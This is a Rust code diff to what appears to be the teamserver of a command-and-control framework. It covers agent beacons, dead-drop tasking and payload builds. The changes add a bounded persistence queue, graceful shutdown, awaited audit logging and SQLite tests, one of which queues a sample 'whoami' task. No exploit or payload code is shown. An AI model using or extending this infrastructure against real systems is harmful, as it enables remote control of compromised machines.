@@ -63,7 +63,7 @@ struct AppState {
     config: Config,
     db_path: Option<PathBuf>,
     state_file: Option<PathBuf>,
-    persist_tx: tokio::sync::mpsc::UnboundedSender<PersistEvent>,
+    persist_tx: persistence::PersistSender,
 }
 
 /// Scratch buffer for live stream chunks uploaded by the agent. Each chunk
@@ -162,7 +162,8 @@ async fn main() {
 
     // Single persistence channel shared by AppState, AuditState, requeue, and
     // the persistence worker (no second channel / sender swap).
-    let (persist_tx, persist_rx) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+    let (persist_tx, persist_rx) =
+        tokio::sync::mpsc::channel(persistence::PERSIST_CHANNEL_CAPACITY);
     let app_state = AppState {
         store,
         config: config.clone(),
@@ -176,8 +177,8 @@ async fn main() {
         tx: persist_tx.clone(),
     };
 
-    let shared_for_worker = shared.clone();
-    persistence::spawn(
+    let shared_for_worker = config.state_file.as_ref().map(|_| shared.clone());
+    let persistence_worker = persistence::spawn(
         shared_for_worker,
         config.db_path.clone(),
         config.state_file.clone(),
@@ -185,7 +186,8 @@ async fn main() {
     );
 
     // Start the re-queue worker.
-    requeue::spawn(shared.clone(), persist_tx.clone());
+    let (shutdown_tx, shutdown_rx) = tokio::sync::watch::channel(false);
+    let requeue_worker = requeue::spawn(shared.clone(), persist_tx.clone(), shutdown_rx);
 
     // SOCKS5 is experimental and incomplete; only start when explicitly bound.
     if let Some(bind) = config.socks_bind_addr.clone() {
@@ -273,7 +275,28 @@ async fn main() {
 
     let listener = TcpListener::bind(&config.bind_addr).await.unwrap();
     println!("Teamserver listening on {}", listener.local_addr().unwrap());
-    axum::serve(listener, app).await.unwrap();
+    axum::serve(listener, app)
+        .with_graceful_shutdown(shutdown_signal(shutdown_tx.clone()))
+        .await
+        .unwrap();
+    // Dropping the final sender closes the bounded queue after active handlers
+    // finish; awaiting the worker drains every accepted request.
+    let _ = shutdown_tx.send(true);
+    let _ = requeue_worker.await;
+    drop(audit);
+    drop(shared);
+    drop(persist_tx);
+    if let Err(err) = persistence_worker.await {
+        eprintln!("[-] persistence worker join failure: {err}");
+    }
+}
+
+async fn shutdown_signal(shutdown_tx: tokio::sync::watch::Sender<bool>) {
+    tokio::signal::ctrl_c()
+        .await
+        .expect("failed to install Ctrl-C signal handler");
+    println!("Shutdown signal received; draining persistence queue...");
+    let _ = shutdown_tx.send(true);
 }
 
 #[derive(Clone)]
@@ -952,7 +975,7 @@ async fn handle_beacon(
                 last_seen_unix: now,
             });
         let first_seen = s.store.agents[&agent_id].first_seen_unix;
-        let _ = s.persist_tx.send(PersistEvent::AgentUpsert {
+        let _ = persistence::enqueue(&s.persist_tx, PersistEvent::AgentUpsert {
             agent_id: agent_id.clone(),
             registration_json: reg_json,
             first_seen_unix: first_seen,
@@ -960,7 +983,7 @@ async fn handle_beacon(
             is_new,
         });
         if let Some(ref t) = task_opt {
-            let _ = s.persist_tx.send(PersistEvent::TaskDispatched {
+            let _ = persistence::enqueue(&s.persist_tx, PersistEvent::TaskDispatched {
                 task_id: t.task_id.clone(),
                 dispatched_at_unix: now,
             });
@@ -1044,7 +1067,7 @@ async fn handle_dead_drop_get(
         (task, s.config.default_sleep_seconds)
     };
     if let Some(ref t) = task_opt {
-        let _ = api.shared.lock().await.persist_tx.send(PersistEvent::TaskDispatched {
+        let _ = persistence::enqueue(&api.shared.lock().await.persist_tx, PersistEvent::TaskDispatched {
             task_id: t.task_id.clone(),
             dispatched_at_unix: unix_now(),
         });
@@ -1080,7 +1103,7 @@ async fn handle_dead_drop_push(
         "dead_drop_push",
         Some(&agent_id),
         Some(&payload.task.task_id),
-    );
+    ).await?;
     if payload.task.task_id.trim().is_empty() {
         return Err((StatusCode::BAD_REQUEST, "task_id required".into()));
     }
@@ -1109,7 +1132,7 @@ async fn handle_dead_drop_push(
         s.store
             .tasks
             .insert(payload.task.task_id.clone(), record.clone());
-        let _ = s.persist_tx.send(PersistEvent::TaskQueued {
+        let _ = persistence::enqueue(&s.persist_tx, PersistEvent::TaskQueued {
             task_id: payload.task.task_id.clone(),
             agent_id: agent_id.clone(),
             command: payload.task.command.clone(),
@@ -1548,7 +1571,7 @@ async fn handle_response(
                     if let Some(queue) = s.store.pending_tasks.get_mut(&agent_id) {
                         queue.retain(|id| id != &task_id);
                     }
-                    let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
+                    let _ = persistence::enqueue(&s.persist_tx, PersistEvent::TaskCompleted {
                         task_id,
                         status: serde_json::to_value(
                             &s.store
@@ -1570,7 +1593,7 @@ async fn handle_response(
             .entry(agent_id.clone())
             .or_insert_with(Vec::new)
             .push(payload.clone());
-        let _ = s.persist_tx.send(PersistEvent::ResponseAppended {
+        let _ = persistence::enqueue(&s.persist_tx, PersistEvent::ResponseAppended {
             agent_id,
             response: payload,
         });
@@ -1900,7 +1923,7 @@ async fn api_get_agents(
     Query(query): Query<AgentQuery>,
 ) -> Result<Json<Vec<AgentSummary>>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "list_agents", None, None);
+    audit::record(&api.audit.tx, "", "list_agents", None, None).await?;
     let s = api.shared.lock().await;
     let now = unix_now();
     let mut agents = s
@@ -1925,7 +1948,7 @@ async fn api_get_agent(
     AxumPath(agent_id): AxumPath<String>,
 ) -> Result<Json<AgentSummary>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "get_agent", Some(&agent_id), None);
+    audit::record(&api.audit.tx, "", "get_agent", Some(&agent_id), None).await?;
     let s = api.shared.lock().await;
     let agent = s.store.agents.get(&agent_id).ok_or_else(|| {
         (
@@ -1946,7 +1969,7 @@ async fn api_delete_agent(
     AxumPath(agent_id): AxumPath<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "delete_agent", Some(&agent_id), None);
+    audit::record(&api.audit.tx, "", "delete_agent", Some(&agent_id), None).await?;
 
     let found = {
         let mut s = api.shared.lock().await;
@@ -1956,7 +1979,7 @@ async fn api_delete_agent(
         s.store
             .tasks
             .retain(|_, task| task.agent_id != agent_id);
-        let _ = s.persist_tx.send(PersistEvent::AgentRemoved {
+        let _ = persistence::enqueue(&s.persist_tx, PersistEvent::AgentRemoved {
             agent_id: agent_id.clone(),
         });
         found
@@ -1989,7 +2012,7 @@ async fn api_add_task(
         "add_task",
         Some(&payload.agent_id),
         Some(&payload.task.task_id),
-    );
+    ).await?;
     if payload.agent_id.trim().is_empty() {
         return Err((StatusCode::BAD_REQUEST, "agent_id is required".to_owned()));
     }
@@ -2018,7 +2041,7 @@ async fn api_add_task(
         dispatched_at_unix: None,
         completed_at_unix: None,
     };
-    {
+    let (persist_tx, position) = {
         let mut s = api.shared.lock().await;
         // Existence check + insert under the same lock to avoid duplicate races.
         if s.store.tasks.contains_key(&payload.task.task_id) {
@@ -2028,6 +2051,28 @@ async fn api_add_task(
             ));
         }
         let position = next_queue_position(&mut s.store, &payload.agent_id);
+        (s.persist_tx.clone(), position)
+    };
+    persistence::persist(
+        &persist_tx,
+        PersistEvent::TaskQueued {
+            task_id: payload.task.task_id.clone(),
+            agent_id: payload.agent_id.clone(),
+            command: payload.task.command.clone(),
+            arguments_json,
+            created_at_unix: now,
+            position,
+        },
+    )
+    .await
+    .map_err(|err| (StatusCode::SERVICE_UNAVAILABLE, format!("persistence failed: {err}")))?;
+    {
+        let mut s = api.shared.lock().await;
+        // The task ID was reserved before persistence. It must still be free
+        // unless another request violated the single-lock invariant.
+        if s.store.tasks.contains_key(&payload.task.task_id) {
+            return Err((StatusCode::CONFLICT, "task_id was concurrently queued".into()));
+        }
         s.store
             .pending_tasks
             .entry(payload.agent_id.clone())
@@ -2036,14 +2081,6 @@ async fn api_add_task(
         s.store
             .tasks
             .insert(payload.task.task_id.clone(), record.clone());
-        let _ = s.persist_tx.send(PersistEvent::TaskQueued {
-            task_id: payload.task.task_id.clone(),
-            agent_id: payload.agent_id.clone(),
-            command: payload.task.command.clone(),
-            arguments_json,
-            created_at_unix: now,
-            position,
-        });
     }
     Ok(Json(record))
 }
@@ -2079,7 +2116,7 @@ async fn api_get_tasks(
     Query(query): Query<TaskQuery>,
 ) -> Result<Json<Vec<TaskRecord>>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "list_tasks", None, None);
+    audit::record(&api.audit.tx, "", "list_tasks", None, None).await?;
     let s = api.shared.lock().await;
     let mut tasks = s
         .store
@@ -2109,7 +2146,7 @@ async fn api_get_task(
     AxumPath(task_id): AxumPath<String>,
 ) -> Result<Json<TaskRecord>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "get_task", None, Some(&task_id));
+    audit::record(&api.audit.tx, "", "get_task", None, Some(&task_id)).await?;
     let s = api.shared.lock().await;
     let task = s
         .store
@@ -2126,7 +2163,7 @@ async fn api_get_task_responses(
     AxumPath(task_id): AxumPath<String>,
 ) -> Result<Json<Vec<AgentResponse>>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "get_task_responses", None, Some(&task_id));
+    audit::record(&api.audit.tx, "", "get_task_responses", None, Some(&task_id)).await?;
     let s = api.shared.lock().await;
     let responses = s
         .store
@@ -2151,7 +2188,7 @@ async fn api_get_responses(
     Query(query): Query<ResponseQuery>,
 ) -> Result<Json<HashMap<String, Vec<AgentResponse>>>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "list_responses", query.agent_id.as_deref(), None);
+    audit::record(&api.audit.tx, "", "list_responses", query.agent_id.as_deref(), None).await?;
     let s = api.shared.lock().await;
     let responses = s
         .store
@@ -2190,7 +2227,7 @@ async fn api_payload_config(
     headers: HeaderMap,
 ) -> Result<Json<PayloadConfig>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "payload_config", None, None);
+    audit::record(&api.audit.tx, "", "payload_config", None, None).await?;
     let s = api.shared.lock().await;
     Ok(Json(PayloadConfig {
         callback_url: s.config.callback_url.clone(),
@@ -2204,7 +2241,7 @@ async fn api_build_payload(
     Json(payload): Json<PayloadBuildRequest>,
 ) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "build_payload", None, None);
+    audit::record(&api.audit.tx, "", "build_payload", None, None).await?;
     let (config, persist_tx) = {
         let s = api.shared.lock().await;
         (s.config.clone(), s.persist_tx.clone())
@@ -2547,7 +2584,7 @@ async fn api_build_payload(
         let mut s = api.shared.lock().await;
         s.store.payloads.insert(build_id.clone(), artifact.clone());
     }
-    let _ = persist_tx.send(PersistEvent::PayloadUpserted {
+    let _ = persistence::enqueue(&persist_tx, PersistEvent::PayloadUpserted {
         build_id: build_id.clone(),
         artifact_json: serde_json::to_string(&artifact).map_err(internal_error)?,
     });
@@ -2566,7 +2603,7 @@ async fn api_get_payload_artifacts(
     headers: HeaderMap,
 ) -> Result<Json<Vec<PayloadArtifact>>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "list_payloads", None, None);
+    audit::record(&api.audit.tx, "", "list_payloads", None, None).await?;
     let s = api.shared.lock().await;
     let mut artifacts = s.store.payloads.values().cloned().collect::<Vec<_>>();
     artifacts.sort_by_key(|artifact| Reverse(artifact.created_at_unix));
@@ -2578,7 +2615,7 @@ async fn api_delete_payload_artifacts(
     headers: HeaderMap,
 ) -> Result<StatusCode, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "clear_payloads", None, None);
+    audit::record(&api.audit.tx, "", "clear_payloads", None, None).await?;
     let (payload_dir, persist_tx) = {
         let s = api.shared.lock().await;
         (s.config.payload_dir.clone(), s.persist_tx.clone())
@@ -2591,7 +2628,7 @@ async fn api_delete_payload_artifacts(
         ));
     }
 
-    let _ = persist_tx.send(PersistEvent::PayloadsCleared);
+    let _ = persistence::enqueue(&persist_tx, PersistEvent::PayloadsCleared);
 
     match std::fs::read_dir(&payload_dir) {
         Ok(entries) => {
@@ -2629,7 +2666,7 @@ async fn api_get_payload_artifact(
     AxumPath(build_id): AxumPath<String>,
 ) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "get_payload", Some(&build_id), None);
+    audit::record(&api.audit.tx, "", "get_payload", Some(&build_id), None).await?;
     let s = api.shared.lock().await;
     let artifact = s
         .store
@@ -2651,7 +2688,7 @@ async fn api_delete_payload_artifact(
     AxumPath(build_id): AxumPath<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
-    audit::record(&api.audit.tx, "", "delete_payload", Some(&build_id), None);
+    audit::record(&api.audit.tx, "", "delete_payload", Some(&build_id), None).await?;
     validate_build_id(&build_id)?;
     let (payload_dir, persist_tx, known) = {
         let s = api.shared.lock().await;
@@ -2680,7 +2717,7 @@ async fn api_delete_payload_artifact(
         let mut s = api.shared.lock().await;
         s.store.payloads.remove(&build_id);
     }
-    let _ = persist_tx.send(PersistEvent::PayloadRemoved {
+    let _ = persistence::enqueue(&persist_tx, PersistEvent::PayloadRemoved {
         build_id,
     });
     Ok(StatusCode::NO_CONTENT)
@@ -2704,7 +2741,7 @@ async fn api_get_artifact(
         "get_artifact",
         Some(&agent_id),
         Some(&task_id),
-    );
+    ).await?;
     let download_dir = {
         let s = api.shared.lock().await;
         s.config.download_dir.clone()
@@ -2869,8 +2906,8 @@ mod tests {
         }
     }
 
-    fn api_state(store: Store) -> ApiState {
-        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+    async fn api_state(store: Store) -> ApiState {
+        let (tx, rx) = tokio::sync::mpsc::channel(persistence::PERSIST_CHANNEL_CAPACITY);
         let mut config = test_config();
         config.default_sleep_seconds = 9;
         let app = AppState {
@@ -2884,11 +2921,31 @@ mod tests {
         let audit = AuditState {
             tx: app.persist_tx.clone(),
         };
+        let shared = Arc::new(Mutex::new(app));
+        // Test helper: no durable backend is required for handler behavior,
+        // but the worker must exist so acknowledged mutations can complete.
+        persistence::spawn(Some(shared.clone()), None, Some(std::env::temp_dir().join("nagomio-test-state.json")), rx);
         ApiState {
-            shared: Arc::new(Mutex::new(app)),
+            shared,
             auth,
             audit,
         }
+    }
+
+    fn sqlite_worker() -> (
+        persistence::PersistSender,
+        tokio::task::JoinHandle<()>,
+        PathBuf,
+    ) {
+        let path = std::env::temp_dir().join(format!(
+            "nagomio-persistence-test-{}-{}.db",
+            std::process::id(),
+            unix_now_nanos()
+        ));
+        let _ = std::fs::remove_file(&path);
+        let (tx, rx) = tokio::sync::mpsc::channel(persistence::PERSIST_CHANNEL_CAPACITY);
+        let worker = persistence::spawn(None, Some(path.clone()), None, rx);
+        (tx, worker, path)
     }
 
     #[test]
@@ -2959,7 +3016,7 @@ mod tests {
             s.pending_tasks.clear();
             s.tasks.clear();
             s
-        });
+        }).await;
 
         let add_req = AddTaskReq {
             agent_id: "agent-1".to_owned(),
@@ -3003,6 +3060,80 @@ mod tests {
         let s = api.shared.lock().await;
         assert_eq!(s.store.tasks["task-1"].status, TaskStatus::Dispatched);
         assert!(s.store.tasks["task-1"].dispatched_at_unix.is_some());
+    }
+
+    #[tokio::test]
+    async fn audit_event_reaches_sqlite() {
+        let (tx, worker, path) = sqlite_worker();
+        persistence::persist(
+            &tx,
+            PersistEvent::Audit {
+                timestamp_unix: 42,
+                source_ip: "127.0.0.1".to_owned(),
+                action: "test_audit".to_owned(),
+                agent_id: Some("agent-1".to_owned()),
+                task_id: None,
+            },
+        )
+        .await
+        .expect("audit write should be acknowledged");
+        let conn = persistence::open_db(&path).expect("database should open");
+        let action: String = conn
+            .query_row("SELECT action FROM audit_log", [], |row| row.get(0))
+            .expect("audit row should exist");
+        assert_eq!(action, "test_audit");
+        drop(conn);
+        drop(tx);
+        worker.await.expect("worker should drain cleanly");
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[tokio::test]
+    async fn requeue_event_reaches_sqlite() {
+        let (tx, worker, path) = sqlite_worker();
+        persistence::persist(
+            &tx,
+            PersistEvent::TaskQueued {
+                task_id: "task-1".to_owned(),
+                agent_id: "agent-1".to_owned(),
+                command: "whoami".to_owned(),
+                arguments_json: "[]".to_owned(),
+                created_at_unix: 1,
+                position: 0,
+            },
+        )
+        .await
+        .expect("queue write should be acknowledged");
+        persistence::persist(
+            &tx,
+            PersistEvent::TaskDispatched {
+                task_id: "task-1".to_owned(),
+                dispatched_at_unix: 2,
+            },
+        )
+        .await
+        .expect("dispatch write should be acknowledged");
+        persistence::persist(
+            &tx,
+            PersistEvent::TaskReQueued {
+                task_id: "task-1".to_owned(),
+            },
+        )
+        .await
+        .expect("requeue write should be acknowledged");
+        let conn = persistence::open_db(&path).expect("database should open");
+        let status: String = conn
+            .query_row("SELECT status FROM tasks WHERE task_id = 'task-1'", [], |row| row.get(0))
+            .expect("task should exist");
+        let pending: i64 = conn
+            .query_row("SELECT COUNT(*) FROM pending_tasks WHERE task_id = 'task-1'", [], |row| row.get(0))
+            .expect("pending row count should read");
+        assert_eq!(status, "re_queued");
+        assert_eq!(pending, 1);
+        drop(conn);
+        drop(tx);
+        worker.await.expect("worker should drain cleanly");
+        let _ = std::fs::remove_file(path);
     }
 
     #[test]
@@ -3083,7 +3214,7 @@ mod tests {
             config,
             db_path: None,
             state_file: None,
-            persist_tx: tokio::sync::mpsc::unbounded_channel::<PersistEvent>().0,
+            persist_tx: tokio::sync::mpsc::channel(persistence::PERSIST_CHANNEL_CAPACITY).0,
         }));
         rt.block_on(async {
             // First call OK.
